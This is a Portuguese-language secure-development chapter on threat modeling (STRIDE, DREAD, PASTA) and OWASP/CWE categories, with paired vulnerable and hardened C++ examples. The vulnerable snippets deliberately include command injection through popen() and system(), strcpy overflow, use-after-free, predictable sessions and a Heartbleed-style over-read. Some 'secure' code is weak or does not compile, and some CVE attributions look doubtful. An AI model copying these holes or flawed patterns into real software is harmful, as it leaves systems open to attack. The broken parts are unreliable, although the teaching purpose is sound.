Modelagem de ameaças é a prática de identificar sistematicamente como um sistema pode ser atacado. É uma das atividades mais valiosas do SDD porque força o time a pensar como adversários antes que o código seja escrito.

### 3.1 STRIDE

STRIDE é um modelo de classificação de ameaças desenvolvido pela Microsoft. Cada letra representa uma categoria de ameaça:

#### Spoofing (Falsificação de Identidade)

Spoofing ocorre quando um atacante assume a identidade de outro usuário ou componente do sistema.

```cpp
#include <string>
#include <unordered_map>
#include <chrono>
#include <random>
#include <sstream>
#include <iomanip>
#include <iostream>
#include <mutex>
#include <functional>

// VULNERABLE: Spoofing — tokens are predictable, no expiration check
class VulnerableSessionManager {
public:
    std::string createSession(const std::string& userId) {
        // VULNERABLE: Sequential, predictable session IDs
        std::string sessionId = "sess_" + std::to_string(nextId_++);
        sessions_[sessionId] = userId;
        return sessionId;
    }

    bool validateSession(const std::string& sessionId) {
        // VULNERABLE: No expiration, no signature verification
        return sessions_.find(sessionId) != sessions_.end();
    }

private:
    int nextId_ = 1;
    std::unordered_map<std::string, std::string> sessions_;
};

// SECURE: Spoofing-resistant session management
class SecureSessionManager {
public:
    SecureSessionManager() : rng_(std::random_device{}()) {}

    struct SessionData {
        std::string userId;
        std::chrono::steady_clock::time_point createdAt;
        std::chrono::steady_clock::time_point expiresAt;
        std::string signature;
    };

    std::string createSession(const std::string& userId,
                              std::chrono::minutes ttl = std::chrono::minutes{30}) {
        std::string tokenId = generateSecureToken(32);
        std::string secret = generateSecureToken(64);
        std::string signature = computeHmac(tokenId + userId, secret);

        SessionData session;
        session.userId = userId;
        session.createdAt = std::chrono::steady_clock::now();
        session.expiresAt = session.createdAt + ttl;
        session.signature = signature;

        std::lock_guard<std::mutex> lock(mutex_);
        sessions_[tokenId] = session;
        secrets_[tokenId] = secret;

        return tokenId;
    }

    bool validateSession(const std::string& sessionId) {
        std::lock_guard<std::mutex> lock(mutex_);

        auto it = sessions_.find(sessionId);
        if (it == sessions_.end()) return false;

        // Verify expiration
        if (std::chrono::steady_clock::now() > it->second.expiresAt) {
            sessions_.erase(it);
            secrets_.erase(sessionId);
            return false;
        }

        // Verify signature to prevent token forgery
        auto secretIt = secrets_.find(sessionId);
        if (secretIt == secrets_.end()) return false;

        std::string expectedSig = computeHmac(
            sessionId + it->second.userId, secretIt->second
        );
        return constantTimeCompare(it->second.signature, expectedSig);
    }

    void invalidateSession(const std::string& sessionId) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.erase(sessionId);
        secrets_.erase(sessionId);
    }

private:
    std::string generateSecureToken(size_t length) {
        static const char charset[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
            "0123456789";
        std::uniform_int_distribution<size_t> dist(0, sizeof(charset) - 2);
        std::string token;
        token.reserve(length);
        for (size_t i = 0; i < length; ++i) {
            token += charset[dist(rng_)];
        }
        return token;
    }

    std::string computeHmac(const std::string& data,
                            const std::string& key) {
        // Simplified HMAC — in production use a cryptographic library
        std::hash<std::string> hasher;
        size_t h1 = hasher(key + data);
        size_t h2 = hasher(data + key + std::to_string(h1));
        std::stringstream ss;
        ss << std::hex << std::setfill('0') << std::setw(16) << h1
           << std::setw(16) << h2;
        return ss.str();
    }

    bool constantTimeCompare(const std::string& a, const std::string& b) {
        if (a.size() != b.size()) return false;
        volatile uint8_t result = 0;
        for (size_t i = 0; i < a.size(); ++i) {
            result |= static_cast<uint8_t>(a[i]) ^ static_cast<uint8_t>(b[i]);
        }
        return result == 0;
    }

    std::unordered_map<std::string, SessionData> sessions_;
    std::unordered_map<std::string, std::string> secrets_;
    std::mt19937_64 rng_;
    std::mutex mutex_;
};
```

#### Tampering (Adulteração)

Tampering ocorre quando um atacante modifica dados ou código de forma não autorizada.

```cpp
#include <string>
#include <cstdint>
#include <vector>
#include <cstring>
#include <iostream>
#include <stdexcept>

class DataIntegrityProtector {
public:
    struct ProtectedData {
        std::string payload;
        uint32_t checksum;
    };

    // Creates a protected record with integrity verification
    ProtectedData protect(const std::string& data) {
        ProtectedData pd;
        pd.payload = data;
        pd.checksum = computeCRC32(data);
        return pd;
    }

    // Verifies data hasn't been tampered with
    bool verify(const ProtectedData& data) {
        uint32_t expected = computeCRC32(data.payload);
        return expected == data.checksum;
    }

    // Detects tampering and throws on integrity failure
    const std::string& getVerified(const ProtectedData& data) {
        if (!verify(data)) {
            throw std::runtime_error(
                "DATA INTEGRITY VIOLATION: Payload has been tampered with"
            );
        }
        return data.payload;
    }

private:
    uint32_t computeCRC32(const std::string& data) {
        uint32_t crc = 0xFFFFFFFF;
        for (unsigned char byte : data) {
            crc ^= byte;
            for (int j = 0; j < 8; ++j) {
                crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
            }
        }
        return ~crc;
    }
};

int main() {
    DataIntegrityProtector protector;

    auto record = protector.protect("Transfer $500 to account XYZ");

    // Legitimate access
    std::cout << "Original valid: " << protector.verify(record) << std::endl;

    // Tampering attempt
    record.payload = "Transfer $5000 to account EVIL";
    try {
        protector.getVerified(record);
        std::cout << "Tampering went undetected!" << std::endl;
    } catch (const std::runtime_error& e) {
        std::cout << "Tampering detected: " << e.what() << std::endl;
    }

    return 0;
}
```

#### Repudiation (Rejeição de Responsabilidade)

Repudiation ocorre quando um usuário pode negar ter executado uma ação, por ausência de evidência auditável.

```cpp
#include <string>
#include <chrono>
#include <fstream>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <mutex>

class AuditTrail {
public:
    struct AuditEntry {
        std::string timestamp;
        std::string userId;
        std::string action;
        std::string resource;
        std::string outcome;
        std::string ipAddress;
    };

    static AuditTrail& instance() {
        static AuditTrail trail;
        return trail;
    }

    void record(const std::string& userId, const std::string& action,
                const std::string& resource, const std::string& outcome,
                const std::string& ipAddress = "internal") {
        std::lock_guard<std::mutex> lock(mutex_);

        AuditEntry entry;
        entry.timestamp = currentTimestamp();
        entry.userId = userId;
        entry.action = action;
        entry.resource = resource;
        entry.outcome = outcome;
        entry.ipAddress = ipAddress;

        appendToFile(entry);
        std::cout << "[AUDIT] " << entry.timestamp
                  << " | user=" << entry.userId
                  << " | action=" << entry.action
                  << " | resource=" << entry.resource
                  << " | outcome=" << entry.outcome << std::endl;
    }

private:
    AuditTrail() = default;

    std::string currentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t_now = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&time_t_now), "%Y-%m-%dT%H:%M:%S");
        return ss.str();
    }

    void appendToFile(const AuditEntry& entry) {
        std::ofstream logFile("audit.log", std::ios::app);
        if (logFile.is_open()) {
            logFile << entry.timestamp << "|"
                    << entry.userId << "|"
                    << entry.action << "|"
                    << entry.resource << "|"
                    << entry.outcome << "|"
                    << entry.ipAddress << std::endl;
        }
    }

    std::mutex mutex_;
};

// Usage: every critical operation records an audit entry
void transferFunds(const std::string& userId, const std::string& from,
                   const std::string& to, double amount) {
    AuditTrail::instance().record(userId, "TRANSFER", from, "INITIATED");

    // ... business logic ...

    AuditTrail::instance().record(
        userId, "TRANSFER",
        from + "->" + to + ":" + std::to_string(amount),
        "COMPLETED"
    );
}
```

#### Information Disclosure (Divulgação de Informações)

Information Disclosure ocorre quando dados sensíveis são expostos a atores não autorizados.

```cpp
#include <string>
#include <vector>
#include <iostream>
#include <stdexcept>
#include <cstring>

// VULNERABLE: Information disclosure via unsafe memory handling
class VulnerableDataStore {
public:
    void storeSecret(const std::string& key, const std::string& value) {
        // VULNERABLE: Secrets stored in plain text
        // VULNERABLE: No access control
        secrets_[key] = value;
    }

    std::string getSecret(const std::string& key) {
        // VULNERABLE: No authentication check
        return secrets_[key];  // Returns empty string if not found
    }

    // VULNERABLE: Buffer that leaks old data
    void processBuffer(const char* input, size_t len) {
        char buffer[256];
        // VULNERABLE: Does not zero old data — previous secrets remain
        memcpy(buffer, input, len);
        // Process buffer...
        // buffer is destroyed without zeroing — data remains on stack
    }

private:
    std::unordered_map<std::string, std::string> secrets_;
};

// SECURE: Defense against information disclosure
class SecureDataStore {
public:
    struct SecretEntry {
        std::vector<uint8_t> encryptedValue;
        std::vector<uint8_t> salt;
        bool hasAccess = false;
    };

    void storeSecret(const std::string& key, const std::string& value,
                     const std::string& accessKey) {
        std::vector<uint8_t> salt = generateSalt(16);
        std::vector<uint8_t> encrypted = encrypt(value, accessKey, salt);

        std::lock_guard<std::mutex> lock(mutex_);
        SecretEntry entry;
        entry.encryptedValue = encrypted;
        entry.salt = salt;
        secrets_[key] = entry;
    }

    std::string getSecret(const std::string& key,
                          const std::string& accessKey) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = secrets_.find(key);
        if (it == secrets_.end()) {
            throw std::runtime_error("Secret not found");
        }
        return decrypt(it->second.encryptedValue, accessKey, it->second.salt);
    }

    // Secure buffer handling: zeros memory after use
    void processBuffer(const uint8_t* input, size_t len) {
        std::vector<uint8_t> buffer(256, 0);
        size_t copyLen = std::min(len, buffer.size());
        std::memcpy(buffer.data(), input, copyLen);
        // Process buffer...
        // Securely zero the buffer before destruction
        secureZero(buffer.data(), buffer.size());
    }

    ~SecureDataStore() {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto& [key, entry] : secrets_) {
            secureZero(entry.encryptedValue.data(),
                       entry.encryptedValue.size());
            secureZero(entry.salt.data(), entry.salt.size());
        }
    }

private:
    std::vector<uint8_t> generateSalt(size_t length) {
        std::vector<uint8_t> salt(length);
        // In production: use std::random_device or OS-level CSPRNG
        std::random_device rd;
        for (size_t i = 0; i < length; ++i) {
            salt[i] = static_cast<uint8_t>(rd());
        }
        return salt;
    }

    std::vector<uint8_t> encrypt(const std::string& data,
                                 const std::string& key,
                                 const std::vector<uint8_t>& salt) {
        // Simplified XOR-based encryption for demonstration
        // In production: use AES-256-GCM or ChaCha20-Poly1305
        std::vector<uint8_t> result(data.begin(), data.end());
        for (size_t i = 0; i < result.size(); ++i) {
            result[i] ^= static_cast<uint8_t>(key[i % key.size()]);
            result[i] ^= salt[i % salt.size()];
        }
        return result;
    }

    std::string decrypt(const std::vector<uint8_t>& data,
                        const std::string& key,
                        const std::vector<uint8_t>& salt) {
        std::vector<uint8_t> result(data);
        for (size_t i = 0; i < result.size(); ++i) {
            result[i] ^= salt[i % salt.size()];
            result[i] ^= static_cast<uint8_t>(key[i % key.size()]);
        }
        return std::string(result.begin(), result.end());
    }

    void secureZero(uint8_t* ptr, size_t len) {
        volatile uint8_t* vptr = ptr;
        for (size_t i = 0; i < len; ++i) {
            vptr[i] = 0;
        }
    }

    std::unordered_map<std::string, SecretEntry> secrets_;
    std::mutex mutex_;
};
```

#### Denial of Service (Negação de Serviço)

DoS ocorre quando um atacante torna o sistema indisponível para usuários legítimos.

```cpp
#include <string>
#include <unordered_map>
#include <chrono>
#include <mutex>
#include <iostream>
#include <atomic>

// VULNERABLE: No rate limiting, unbounded resource consumption
class VulnerableService {
public:
    std::string handleRequest(const std::string& userId,
                              const std::string& request) {
        // VULNERABLE: No rate limiting
        // VULNERABLE: No resource limits
        // VULNERABLE: Expensive operation without bounds
        std::string result;
        for (int i = 0; i < 1000000; ++i) {
            result += request;  // Unbounded memory growth
        }
        return result;
    }
};

// SECURE: Defense against denial of service
class RateLimitedService {
public:
    struct RequestQuota {
        int requestCount = 0;
        std::chrono::steady_clock::time_point windowStart;
        int maxRequests;
        std::chrono::seconds windowDuration;

        RequestQuota(int max, std::chrono::seconds window)
            : maxRequests(max), windowDuration(window) {
            windowStart = std::chrono::steady_clock::now();
        }
    };

    explicit RateLimitedService(size_t maxResponseSize = 1024 * 1024)
        : maxResponseSize_(maxResponseSize) {}

    std::string handleRequest(const std::string& userId,
                              const std::string& request) {
        if (!checkRateLimit(userId)) {
            throw std::runtime_error(
                "Rate limit exceeded for user: " + userId
            );
        }

        if (request.size() > 8192) {
            throw std::runtime_error("Request exceeds maximum size");
        }

        std::string result = processRequest(request);

        if (result.size() > maxResponseSize_) {
            result.resize(maxResponseSize_);
        }
        return result;
    }

private:
    bool checkRateLimit(const std::string& userId) {
        std::lock_guard<std::mutex> lock(mutex_);

        auto now = std::chrono::steady_clock::now();
        auto& quota = quotas_[userId];

        if (quota.requestCount == 0 ||
            now - quota.windowStart > std::chrono::seconds{60}) {
            quota = RequestQuota(100, std::chrono::seconds{60});
            return true;
        }

        if (quota.requestCount >= quota.maxRequests) {
            return false;
        }

        quota.requestCount++;
        return true;
    }

    std::string processRequest(const std::string& request) {
        // Bounded processing
        return "Processed: " + request;
    }

    std::unordered_map<std::string, RequestQuota> quotas_;
    std::mutex mutex_;
    size_t maxResponseSize_;
};
```

#### Elevation of Privilege (Escalação de Privilégios)

Escalação de privilégios ocorre quando um atacante obtém acesso a funcionalidades ou dados que não deveria ter.

```cpp
#include <string>
#include <unordered_set>
#include <iostream>
#include <stdexcept>
#include <memory>

enum class Role : uint8_t {
    Guest    = 0,
    User     = 1,
    Operator = 2,
    Admin    = 3
};

// VULNERABLE: Privilege escalation via missing checks
class VulnerableRoleManager {
public:
    void promoteUser(const std::string& userId, const std::string& promoterId) {
        // VULNERABLE: No check if promoter has authority to promote
        // VULNERABLE: Can promote to any role
        roles_[userId] = Role::Admin;  // Always promotes to Admin
        std::cout << "User " << userId << " promoted to Admin by "
                  << promoterId << std::endl;
    }
};

// SECURE: Defense against privilege escalation
class SecureRoleManager {
public:
    struct UserContext {
        std::string userId;
        Role role;
    };

    void promoteUser(const UserContext& promoter,
                     const std::string& targetUserId,
                     Role targetRole) {
        // Verify promoter has sufficient privileges
        if (promoter.role < Role::Admin) {
            throw std::runtime_error(
                "Insufficient privileges to promote users"
            );
        }

        // Verify the target role is not higher than the promoter's role
        if (targetRole >= promoter.role) {
            throw std::runtime_error(
                "Cannot promote user to equal or higher role"
            );
        }

        // Cannot promote yourself
        if (promoter.userId == targetUserId) {
            throw std::runtime_error("Cannot promote yourself");
        }

        std::lock_guard<std::mutex> lock(mutex_);
        roles_[targetUserId] = targetRole;
        std::cout << "User " << targetUserId
                  << " promoted to role " << static_cast<int>(targetRole)
                  << " by " << promoter.userId << std::endl;
    }

    bool hasRole(const std::string& userId, Role requiredRole) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = roles_.find(userId);
        if (it == roles_.end()) return false;
        return it->second >= requiredRole;
    }

private:
    std::unordered_map<std::string, Role> roles_;
    std::mutex mutex_;
};
```

### 3.2 DREAD

DREAD é um sistema de pontuação para classificar a gravidade das ameaças identificadas. Cada ameaça é avaliada em cinco dimensões, de 1 a 10:

| Dimensão | Descrição | Pergunta-guia |
|----------|-----------|---------------|
| **Damage** (Dano) | Quão grave seria a exploração? | O atacante obtém acesso a dados sensíveis? |
| **Reproducibility** (Reprodutibilidade) | Quão fácil é reproduzir o ataque? | Funciona 100% das vezes? |
| **Exploitability** (Explorabilidade) | Quão fácil é explorar a vulnerabilidade? | Precisa de ferramentas especiais? |
| **Affected Users** (Usuários Afetados) | Quantos usuários seriam impactados? | Todo o sistema ou apenas um? |
| **Discoverability** (Descoberta) | Quão fácil é encontrar a vulnerabilidade? | Um atacante precisaria de acesso privilegiado? |

**Pontuação DREAD = (D + R + E + A + D) / 5**

| Faixa de Pontuação | Nível de Risco | Ação Recomendada |
|---------------------|----------------|-------------------|
| 8.0 — 10.0 | Crítico | Correção imediata, release bloqueada |
| 6.0 — 7.9 | Alto | Correção antes do próximo release |
| 4.0 — 5.9 | Médio | Correção planejada no backlog |
| 2.0 — 3.9 | Baixo | Correção quando houver disponibilidade |
| 1.0 — 1.9 | Informativo | Registrar e monitorar |

#### Exemplo de Avaliação DREAD para uma Aplicação C++

| Ameaça | D | R | E | A | D | Média | Risco |
|--------|---|---|---|---|---|-------|-------|
| SQL Injection via login | 9 | 10 | 8 | 10 | 9 | 9.2 | Crítico |
| Path traversal em upload | 7 | 10 | 9 | 5 | 8 | 7.8 | Alto |
| XSS em campo de busca | 5 | 9 | 8 | 8 | 7 | 7.4 | Alto |
| Informação em response body | 4 | 10 | 7 | 3 | 8 | 6.4 | Alto |
| Desabilitar verificação SSL | 6 | 10 | 3 | 2 | 2 | 4.6 | Médio |
| Nome de arquivo em erro | 2 | 10 | 7 | 2 | 6 | 5.4 | Médio |

### 3.3 PASTA (Process for Attack Simulation and Threat Analysis)

PASTA é um modelo de modelagem de ameaças centrado no adversário que combina visão de negócio e visão técnica. Possui sete fases:

**Fase 1: Definição dos Objetivos do Negócio**
- Identificar o que o sistema precisa proteger
- Definir tolerância a riscos
- Exemplo: "O sistema de banking deve proteger transações financeiras com tolerância zero a fraude"

**Fase 2: Definição do Escopo Técnico**
- Documentar componentes do sistema, fluxos de dados, tecnologias
- Exemplo: "API REST em C++ com PostgreSQL, autenticação JWT, interface web"

**Fase 3: Aplicação do Modelo de Ameaças**
- Usar STRIDE para enumerar ameaças em cada componente
- Mapear fluxos de dados e pontos de confiança

**Fase 4: Análise de Vulnerabilidades**
- Identificar vulnerabilidades específicas em cada componente
- Usar ferramentas SAST/DAST e auditoria manual

**Fase 5: Análise de Exploração**
- Determinar como cada vulnerabilidade pode ser explorada
- Simular cenários de ataque (attack trees)

**Fase 6: Impacto e Análise de Risco**
- Avaliar impacto usando DREAD ou CVSS
- Priorizar para remediação

**Fase 7: Geração e Documentação de Countermeasures**
- Projetar e documentar contra-medidas
- Verificar eficácia via testes

**Exemplo de aplicação PASTA para um sistema de login em C++:**

```cpp
// PASTA Phase 3: STRIDE analysis applied to login component

/*
 * Component: LoginService
 * Flow: User -> [Input Validation] -> [Authentication] -> [Session Creation]
 *
 * Spoofing: Attacker impersonates legitimate user
 *   - Mitigation: Multi-factor authentication, rate limiting
 *
 * Tampering: Attacker modifies credentials in transit
 *   - Mitigation: TLS, certificate pinning, request signing
 *
 * Repudiation: User denies login attempt
 *   - Mitigation: Comprehensive audit logging with timestamps
 *
 * Information Disclosure: Password hashes leaked
 *   - Mitigation: bcrypt/scrypt, salt per user, constant-time comparison
 *
 * Denial of Service: Brute-force login attempts
 *   - Mitigation: Account lockout, CAPTCHA, rate limiting per IP
 *
 * Elevation of Privilege: Regular user accesses admin functions
 *   - Mitigation: Role-based access control, session validation
 */

// Implementation guided by PASTA analysis:
class SecureLoginService {
public:
    struct LoginResult {
        bool success;
        std::string sessionId;
        std::string errorMessage;
        int remainingAttempts;
    };

    LoginResult authenticate(const std::string& username,
                             const std::string& password,
                             const std::string& clientIp) {
        // Phase 3 Mitigation: Rate limiting (anti-DoS)
        if (isRateLimited(clientIp)) {
            AuditLogger::instance().record(
                username, "LOGIN_ATTEMPT", clientIp, "RATE_LIMITED"
            );
            return {false, "", "Too many attempts", 0};
        }

        // Phase 4 Mitigation: Input validation
        if (username.empty() || username.size() > 64 ||
            password.empty() || password.size() > 128) {
            return {false, "", "Invalid credentials", -1};
        }

        // Phase 3 Mitigation: Information disclosure prevention
        // Always perform the hash comparison even if user doesn't exist
        // to prevent timing-based user enumeration
        std::string storedHash = getUserHash(username);
        std::string dummyHash = "$2b$12$invalidhashpaddingpaddingpaddingpadding";
        if (storedHash.empty()) storedHash = dummyHash;

        bool valid = verifyPassword(password, storedHash);

        if (valid) {
            std::string sessionId = sessionManager_.createSession(username);
            AuditLogger::instance().record(
                username, "LOGIN", clientIp, "SUCCESS"
            );
            return {true, sessionId, "", -1};
        }

        incrementFailedAttempts(clientIp, username);
        int remaining = getMaxAttempts() - getFailedAttempts(clientIp);
        AuditLogger::instance().record(
            username, "LOGIN", clientIp, "FAILED"
        );
        return {false, "", "Invalid credentials", std::max(0, remaining)};
    }

private:
    bool isRateLimited(const std::string& clientIp) {
        // Implementation: check attempts in last 15 minutes
        return getFailedAttempts(clientIp) >= getMaxAttempts();
    }

    int getMaxAttempts() { return 5; }

    int getFailedAttempts(const std::string& clientIp) {
        // Implementation: query attempt counter
        return 0;
    }

    void incrementFailedAttempts(const std::string& clientIp,
                                 const std::string& username) {
        // Implementation: increment and set expiry
    }

    std::string getUserHash(const std::string& username) {
        // Implementation: lookup user hash from database
        return "";
    }

    bool verifyPassword(const std::string& password,
                        const std::string& storedHash) {
        // Implementation: bcrypt verify
        return false;
    }

    SecureSessionManager sessionManager_;
};
```

---

## 4. OWASP Top 10 e CWE/SANS Top 25

### 4.1 OWASP Top 10 Mapeado para C++

O OWASP Top 10 lista as dez vulnerabilidades de segurança mais críticas em aplicações web. Embora originalmente focado em aplicações web, muitas categorias são diretamente relevantes para sistemas C++:

| # | OWASP Category | CWE Principal | Vulnerabilidade C++ Típica |
|---|----------------|---------------|---------------------------|
| A01 | Broken Access Control | CWE-284 | Falta de verificação de autorização em APIs internas |
| A02 | Cryptographic Failures | CWE-327 | Uso de MD5/SHA1 para hashing de senhas, hardcoded keys |
| A03 | Injection | CWE-78 | Command injection via `system()`, SQL injection |
| A04 | Insecure Design | CWE-200 | Exposição de informações sensíveis em responses |
| A05 | Security Misconfiguration | CWE-16 | Permissões excessivas em arquivos, debug em produção |
| A06 | Vulnerable Components | CWE-1104 | Bibliotecas com CVEs conhecidas não atualizadas |
| A07 | Auth Failures | CWE-287 | Sessões previsíveis, brute force sem mitigação |
| A08 | Data Integrity Failures | CWE-345 | Assinaturas digitais não verificadas |
| A09 | Logging Failures | CWE-778 | Falta de audit trail, logs sem sanitização |
| A10 | SSRF | CWE-918 | Requisições a recursos internos sem validação |

### 4.2 CWE/SANS Top 25 com Exemplos em C++

Os 25 erros mais perigosos e prejudiciais, conforme o CWE/SANS:

| CWE | Nome | Exemplo C++ |
|-----|------|-------------|
| CWE-787 | Out-of-bounds Write | `buffer[i] = val` sem bounds checking |
| CWE-79 | Cross-site Scripting | Saída HTML não sanitizada |
| CWE-89 | SQL Injection | `query = "SELECT * FROM users WHERE id=" + input` |
| CWE-416 | Use After Free | `delete ptr; ptr->method();` |
| CWE-78 | OS Command Injection | `system(user_input.c_str())` |
| CWE-20 | Improper Input Validation | Parse de JSON sem validação de schema |
| CWE-125 | Out-of-bounds Read | `array[large_index]` sem verificação |
| CWE-22 | Path Traversal | `open(base + "/" + user_path)` |
| CWE-352 | Cross-Site Request Forgery | Tokens anti-CSRF ausentes |
| CWE-434 | Unrestricted File Upload | Upload sem validação de tipo/conteúdo |

### 4.3 Exemplos de Código Vulnerável e Mitigação

#### Exemplo 1: Command Injection (CWE-78)

```cpp
#include <string>
#include <cstdlib>
#include <iostream>
#include <array>
#include <cstdio>
#include <memory>

// VULNERABLE: OS Command Injection
std::string getFileInfoVulnerable(const std::string& filename) {
    // CRITICAL: User input directly in shell command
    std::string command = "ls -la " + filename;
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(
        popen(command.c_str(), "r"), pclose
    );
    if (!pipe) return "Error";

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// SECURE: Input validation and safe execution
std::string getFileInfoSecure(const std::string& filename) {
    // Validate filename — only allow alphanumeric, dots, hyphens, underscores
    for (char c : filename) {
        if (!std::isalnum(c) && c != '.' && c != '-' && c != '_') {
            throw std::invalid_argument(
                "Invalid character in filename: " + std::string(1, c)
            );
        }
    }

    if (filename.empty() || filename.size() > 255) {
        throw std::invalid_argument("Invalid filename length");
    }

    // Prevent path traversal
    if (filename.find("..") != std::string::npos) {
        throw std::invalid_argument("Path traversal not allowed");
    }

    // Use execvp with argument array instead of shell interpretation
    std::array<const char*, 5> args = {
        "ls", "-la", filename.c_str(), nullptr
    };

    int pipefd[2];
    if (pipe(pipefd) != 0) {
        throw std::runtime_error("Failed to create pipe");
    }

    pid_t pid = fork();
    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        execvp(args[0], const_cast<char* const*>(args.data()));
        _exit(1);
    }

    close(pipefd[1]);
    char buffer[4096];
    std::string result;
    ssize_t n;
    while ((n = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
        buffer[n] = '\0';
        result += buffer;
    }
    close(pipefd[0]);
    waitpid(pid, nullptr, 0);
    return result;
}
```

#### Exemplo 2: Buffer Overflow (CWE-787)

```cpp
#include <cstring>
#include <iostream>
#include <array>
#include <algorithm>

// VULNERABLE: Buffer overflow
void copyUsernameVulnerable(const char* input, char* output) {
    // No bounds checking — classic buffer overflow
    strcpy(output, input);
}

// SECURE: Bounded copy with proper validation
bool copyUsernameSecure(const char* input, size_t inputLen,
                        char* output, size_t outputSize) {
    // Validate input length
    if (inputLen == 0 || inputLen > 32) {
        return false;
    }

    // Check for null terminator
    if (input[inputLen - 1] != '\0') {
        return false;
    }

    // Safe bounded copy
    size_t copyLen = std::min(inputLen, outputSize - 1);
    std::memcpy(output, input, copyLen);
    output[copyLen] = '\0';

    // Validate content — only printable ASCII
    for (size_t i = 0; i < copyLen - 1; ++i) {
        if (output[i] < 32 || output[i] > 126) {
            output[0] = '\0';
            return false;
        }
    }

    return true;
}

// Modern C++ approach: use std::string and std::array
std::string copyUsernameModern(const std::string& input) {
    if (input.empty() || input.size() > 32) {
        throw std::invalid_argument("Invalid username length");
    }

    for (char c : input) {
        if (!std::isprint(static_cast<unsigned char>(c))) {
            throw std::invalid_argument("Non-printable character in username");
        }
    }

    return input;
}
```

#### Exemplo 3: Use-After-Free (CWE-416)

```cpp
#include <memory>
#include <iostream>
#include <string>

// VULNERABLE: Use-after-free
class VulnerableCache {
public:
    struct Entry {
        std::string key;
        std::string value;
    };

    Entry* get(const std::string& key) {
        for (auto& e : entries_) {
            if (e->key == key) return e.get();
        }
        return nullptr;
    }

    void invalidate(const std::string& key) {
        for (auto it = entries_.begin(); it != entries_.end(); ++it) {
            if ((*it)->key == key) {
                entries_.erase(it);
                // PROBLEM: External pointer may still reference this entry
                return;
            }
        }
    }

private:
    std::vector<std::unique_ptr<Entry>> entries_;
};

// SECURE: Prevent use-after-free with safe handle pattern
class SafeCache {
public:
    struct Entry {
        std::string key;
        std::string value;
        uint64_t version = 0;
    };

    class EntryHandle {
    public:
        EntryHandle(SafeCache* cache, uint64_t version)
            : cache_(cache), version_(version) {}

        const Entry* get() const {
            if (!cache_ || cache_->currentVersion_ != version_) {
                return nullptr;
            }
            return cache_->entry_;
        }

    private:
        SafeCache* cache_;
        uint64_t version_;
    };

    SafeCache& operator=(const SafeCache&) = delete;

    EntryHandle get(const std::string& key) {
        if (currentEntry_ && currentEntry_->key == key) {
            return EntryHandle(this, currentVersion_);
        }
        return EntryHandle(nullptr, 0);
    }

    void put(const std::string& key, const std::string& value) {
        currentEntry_ = std::make_unique<Entry>();
        currentEntry_->key = key;
        currentEntry_->value = value;
        currentVersion_++;
    }

    void invalidate(const std::string& key) {
        if (currentEntry_ && currentEntry_->key == key) {
            currentEntry_.reset();
            currentVersion_++;
        }
    }

private:
    std::unique_ptr<Entry> currentEntry_;
    uint64_t currentVersion_ = 0;
};
```

### 4.4 CVEs de Referência para Cada Categoria OWASP

A tabela a seguir conecta cada categoria OWASP com CVEs reais e demonstra como o código C++ vulnerável se manifesta na prática:

| OWASP | CVE Exemplo | Produto | Vulnerabilidade | Impacto |
|-------|-------------|---------|-----------------|---------|
| A01 | CVE-2017-5638 | Apache Struts | Falta de validação de input em Jakarta Multipart parser | Equifax: 147M registros expostos |
| A02 | CVE-2014-0160 | OpenSSL | Buffer over-read sem bounds checking | 500K servidores comprometidos |
| A03 | CVE-2014-6271 | GNU Bash | Code injection via environment variables | 500M+ dispositivos afetados |
| A05 | CVE-2017-0144 | Windows SMB | Configuração insegura do protocolo SMBv1 | WannaCry/NotPetya: $10B+ em danos |
| A06 | CVE-2021-44228 | Log4j | Biblioteca com JNDI lookup inseguro | $100B+ custo global estimado |
| A07 | CVE-2020-1472 | Windows Netlogon | Autenticação fraca em criptografia de canal | Zerologon: domínios AD comprometidos |
| A08 | CVE-2020-10148 | SolarWinds Orion | Verificação de integridade ausente | Supply chain: 18.000+ clientes |

```cpp
// CVE-2014-0160 (Heartbleed) — padrão vulnerável:
void heartbeat_handler(const uint8_t* request, size_t request_len) {
    uint16_t payload_type;
    uint16_t payload_length;
    const uint8_t* payload;

    // Parse request — payload_length comes from attacker
    payload_type = ntohs(*(uint16_t*)(request));
    payload_length = ntohs(*(uint16_t*)(request + 2));
    payload = request + 4;

    // VULNERABLE: reads payload_length bytes from payload
    // but doesn't check if payload is actually that long
    send_response(payload, payload_length);
}

// CVE-2017-5638 (Equifax) — padrão vulnerável em C++:
std::string processContentType(const std::string& contentType) {
    // VULNERABLE: Direct use of unvalidated input
    // In Java/Struts this was OGNL expression evaluation
    std::string command = "process --type=" + contentType;
    system(command.c_str());  // Command injection!
    return command;
}

// CVE-2023-33106 (Qualcomm GPU) — padrão vulnerável:
class GpuBuffer {
public:
    void* getData() { return data_; }
    void release() {
        delete[] static_cast<uint8_t*>(data_);  // freed
        // VULNERABLE: No reference counting
        // Another thread may still use data_ via getData()
    }
private:
    void* data_;
};
```

### 4.5 Tabela de Mapeamento Completa

| OWASP A## | Categoria OWASP | CWE Principal | Vulnerabilidade C++ | Mitigation C++ |
|-----------|-----------------|---------------|---------------------|----------------|
| A01 | Broken Access Control | CWE-284 | Falta de authorization check | RBAC com AuthorizationGateway |
| A02 | Cryptographic Failures | CWE-327 | MD5 para senhas, keys hardcoded | Argon2/bcrypt, HSM/vault |
| A03 | Injection | CWE-78/89 | `system()`, `sprintf` | `execvp`, `std::format`, parameterized queries |
| A04 | Insecure Design | CWE-200 | Exposição em error messages | Design review, info classification |
| A05 | Security Misconfiguration | CWE-16 | Debug flags em build | Build profiles separados |
| A06 | Vulnerable Components | CWE-1104 | OpenSSL desatualizado | Dependency scanning, automated updates |
| A07 | Auth Failures | CWE-287 | Sessions previsíveis | CSPRNG sessions, MFA, lockout |
